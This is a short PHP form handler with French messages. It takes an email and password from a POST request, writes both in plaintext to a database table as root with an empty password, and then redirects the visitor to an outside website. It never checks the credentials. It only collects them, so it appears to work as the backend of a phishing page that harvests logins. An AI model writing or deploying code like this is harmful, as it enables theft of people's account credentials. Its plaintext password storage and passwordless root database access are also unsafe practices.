<?php
    if (!empty($_POST)){
        $error= false;
        $email = htmlspecialchars($_POST['email']);
        $pass = htmlspecialchars($_POST['pass']);

        if(empty($email) || empty($pass)) {
            $error = true;
        }
        if (!$error) {

            try{
                //connexion à la BDD
                $db = new PDO("mysql:host=localhost; dbname=sm;charset=utf8", 'root', '');
                $db->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
                $req = $db->prepare('INSERT INTO actif(email, pass) VALUES(?,?)');
                $req->execute(array($email, $pass));
                header('Location:http://sexemodel.com');
                die();

            } catch (Exception $e) {
                die($e->getMessage());
               
            }
        } else { 
            echo '<p>Veuillez entrer des informaions valides</p>';
        } 
    }
?>